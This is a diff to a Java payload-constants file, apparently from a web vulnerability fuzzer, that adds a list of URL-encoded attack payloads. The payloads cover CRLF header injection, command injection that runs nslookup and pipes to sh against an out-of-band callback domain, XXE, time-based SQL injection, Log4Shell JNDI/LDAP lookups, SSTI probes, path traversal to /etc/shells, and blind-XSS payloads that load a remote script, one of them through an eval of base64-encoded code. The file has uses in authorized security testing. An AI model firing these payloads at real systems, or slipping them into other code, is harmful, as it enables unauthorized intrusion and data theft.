@@ -142,8 +142,8 @@ public class PayloadConstants {
             new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%204", "{path}CRLF"),
             new PayloadInfo("{path}/chaxx", "{path}/chaxx"),
             new PayloadInfo("{path}/%20H", "ng crlf"),
-            new PayloadInfo("{path}/%20HTTP/19.91%0D%0Ac9w:%20x", "ng crlf2"),
-            new PayloadInfo("{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%209", "ng crlf3"),
+            new PayloadInfo("{path}/%20HTTP/19.91%0D%0Ac9w:%20x%0D%0AOrigin:%20WWWWWMMMWWWWWWWW", "ng crlf2"),
+            new PayloadInfo("{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%209Origin:%20WWWWWMMMWWWWWWWW", "ng crlf3"),
             new PayloadInfo("{path_double_url_encoded}", "{double_url_encoded}"),
             new PayloadInfo("{path}%2f..", "{path}%2f.."),
             new PayloadInfo("{path}/..", "{path}/.."),
@@ -172,6 +172,29 @@ public class PayloadConstants {
      * 包含 Spring、信息泄露、Rewrite 和 {sub../} 相关的 payload
      */
     public static final List<PayloadInfo> OOB_ROUTE_PAYLOAD_INFOS = Arrays.asList(
+            // --- 新增通用测试 Payload ---
+            new PayloadInfo("%2F%2Fetc%2Fshells", "//etc/shells"),
+            new PayloadInfo("%24%28env%29", "$(env)"),
+            new PayloadInfo("%7Bfuzz%7D%2Essrf%2Etejq8%2Ezcyy%2Efun", "{fuzz}.ssrf.tejq8.zcyy.fun"),
+            new PayloadInfo("null", "null"),
+            new PayloadInfo("%27%60nslookup%24IFS%40%7Bfuzz%7D%2Ecmdi1%2Etejq8%2Ezcyy%2Efun%7Csh%60%27%24%28nslookup%24IFS%40%7Bfuzz%7D%2Ecmdi1%2Etejq8%2Ezcyy%2Efun%7Csh%29", "cmdi 1"),
+            new PayloadInfo("%26nslookup%20%7Bfuzz%7D%2Ecmdi2%2Etejq8%2Ezcyy%2Efun%26%27%5C%22%600%26nslookup%20%7Bfuzz%7D%2Ecmdi2%2Etejq8%2Ezcyy%2Efun%26%60%27", "cmdi 2"),
+            new PayloadInfo("%2F%2A%24%28nslookup%20cmdi3%2E%7Bfuzz%7D%2Etejq8%2Ezcyy%2Efun%29%60nslookup%20cmdi3%2E%7Bfuzz%7D%2Etejq8%2Ezcyy%2Efun%60%60%2A%2F%2Dnslookup%28cmdi3%2E%7Bfuzz%7D%2Etejq8%2Ezcyy%2Efun%29%2D%27%2F%2A%24%28nslookup%20cmdi3%2E%7Bfuzz%7D%2Etejq8%2Ezcyy%2Efun%29%60nslookup%20cmdi3%2E%7Bfuzz%7D%2Etejq8%2Ezcyy%2Efun%60%20%23%2A%2F%2Dnslookup%28cmdi3%2E%7Bfuzz%7D%2Etejq8%2Ezcyy%2Efun%29%7C%7C%27%5C%22%7C%7Cnslookup%28cmdi3%2E%7Bfuzz%7D%2Etejq8%2Ezcyy%2Efun%29%7C%7C%5C%22%2F%2A%60%2A%2F", "cmdi 3"),
+            new PayloadInfo("%3C%3Fxml%20version%3D%221%2E0%22%20encoding%3D%22UTF%2D8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%21ENTITY%20delay%20SYSTEM%20%22http%3A%2F%2Fhttpbin%2Eorg%2Fdelay%2F7%22%5D%3E%3Croot%3E%26delay%3B%3C%2Froot%3E", "xml delay 7"),
+            new PayloadInfo("1%27%20OR%20%2F%2A%21sleep%2A%2F%28LENGTH%28%27%7Bfuzz%7Dhb%27%29%29%3B%20%2D%2D%20", "1' OR /*!sleep*/"),
+            new PayloadInfo("1%27%20OR%201%2F0%3B%20%2D%2D%20", "1' OR 1/0; -- "),
+            new PayloadInfo("%24%7Bj%24%7Bmain%3A%5Ck5%3A%2DNd%7Di%24%7Bspring%3Ak5%3A%2D%3A%7Dldap%3A%2F%2F%24%7Bsys%3Auser%2Ename%7D%2D%7Bfuzz%7D%2El4j%2Etejq8%2Ezcyy%2Efun%2F%7D", "log4j-v"),
+            new PayloadInfo("%24%7Bjdni%3Aldap%3A%2F%2Fx%2E%7Bfuzz%7D%2El4j%2Etejq8%2Ezcyy%2Efun%2Fa%7D", "log4j-v2"),
+            new PayloadInfo("chaxx123%27%22%3E%2A%2F%2A%2F%3Dend%27%27%27%22%22%22%5B%24%7B%24%28%60%3B%5Cabcc8d%3A%20g00f%250d%250ac9w%3A%20g00s%25c4%258d%25c4%258av5m%3A%20f00Java", "chaxx + crlf"),
+            new PayloadInfo("%29%3B%3F%2F%25ff%27%22%3E%3Cimg%2Fsrc%3Dhttp%3A%2F%2Fig%7Bfuzz%7D%2Etejq8%2Ezcyy%2Efun%3E", ");?/%ff'\"><img>"),
+            new PayloadInfo("%3Clink%20rel%3D%22stylesheet%22%20href%3D%22https%3A%2F%2F%7Bfuzz%7D%2Elnk%2Etejq8%2Ezcyy%2Efun%2Flink%2Ecss%22%3E", "<link>"),
+            new PayloadInfo("%22%3E%3Cscript%20src%3D%22https%3A%2F%2Fjs%2Erip%2Fnm%22%3E%3C%2Fscript%3E", "bxss1"),
+            new PayloadInfo("%22%3E%3Cimg%20src%3Dx%20id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL25tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%20onerror%3Deval%28atob%28this%2Eid%29%29%3E", "bxss2"),
+            new PayloadInfo("%7B%7B9188%2A8%7D%7D", "SSTI1"),
+            new PayloadInfo("%24%7B9188%2A8%7D", "SSTI2"),
+            new PayloadInfo("%23%7B9188%2A8%7D", "SSTI3"),
+            new PayloadInfo("%5B%5B%24%7B9188%2A8%7D%5D%5D", "SSTI4"),
+
             // --- Spring 类路径 Payload ---
             new PayloadInfo("swagger", "swagger"),
             new PayloadInfo("swagger-resources", "swagger2"),
